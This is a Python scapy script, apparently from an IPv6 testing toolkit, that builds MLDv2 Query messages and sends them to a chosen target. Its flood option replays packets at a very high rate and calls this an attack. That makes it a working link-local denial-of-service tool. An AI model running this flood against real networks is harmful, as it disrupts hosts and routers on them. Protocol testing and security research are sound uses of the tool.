#!/usr/bin/python3
import argparse
import sys
import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6MLQuery2
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast
from validate_parameters import is_valid_ipv6
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_num


def main():
    parser = argparse.ArgumentParser(description="Sending MLDv2 Query message(s) to a target, with option to flood. "
                                                 "It is recommended by RFC 3810 to use link-local addresses since "
                                                 "global addresses might be ignored when processing MLDv2 messages.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-mip", dest="multicast_ip", action="store", help="the interested multicast "
                                                                          "address to nodes (set to :: "
                                                                          "if skipping)")
    parser.add_argument("-src", dest="src", action="store", nargs="+", default=[],
                        help="the IPv6 address of source(s) (separated by space if more than 1)")
    parser.add_argument("-n", dest="num_packets", action="store", default=1, type=int,
                        help="the number of packets to send (set to 1 if skipping)")
    parser.add_argument("-f", "--flood", dest="flood", action="store_true", help="flood the target")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(ni.ifaddresses(args.interface)[ni.AF_INET6])
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][length-1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::1"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the multicast IPv6 address
    if args.multicast_ip is None:
        args.multicast_ip = "::"
    if args.multicast_ip is not None:
        if not is_valid_ipv6(args.multicast_ip):
            print("---> The given multicast address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the sources
    if args.src is None:
        args.src = []
    if args.src is not None:
        for i in range(len(args.src)):
            if not is_valid_ipv6(args.src[i]):
                print("---> The given IPv6 address of source(s) is invalid. Try again!!!")
                sys.exit(1)

    # Validate the number of packets
    if args.num_packets is None:
        args.num_packets = 1
    if args.num_packets is not None:
        if not is_valid_num(args.num_packets):
            print("---> The given number of packets is invalid. Try again!!!")
            sys.exit(1)

    # Generate packet
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip, hlim=1)
    HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
    MLD = ICMPv6MLQuery2(type=130, mladdr=args.multicast_ip, sources=args.src, mrd=100)
    packet1 = Ether(src=args.source_mac) / layer3 / HBH / MLD
    if not args.flood:
        if args.destination_ip == "ff02::1" and args.multicast_ip == "::" and args.src == []:
            print("Sending MLDv2 General Query message to the destination: ", args.destination_ip)
        if args.destination_ip != "ff02::1" and args.src == []:
            print("Sending MLDv2 Multicast Address Specific Query message to the destination: ", args.destination_ip)
        if args.src != []:
            print("Sending MLDv2 Multicast Address and Source Specific Query message to the destination: ",
                  args.destination_ip)
        for i in range(args.num_packets):
            sendp(packet1, verbose=False, iface=args.interface)
    if args.flood:
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + " with MLDv2 Query messages (press Ctrl+C to "
                                                                   "stop the attack).....")
        for i in range(5000):
            pkt_list.append(packet1)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
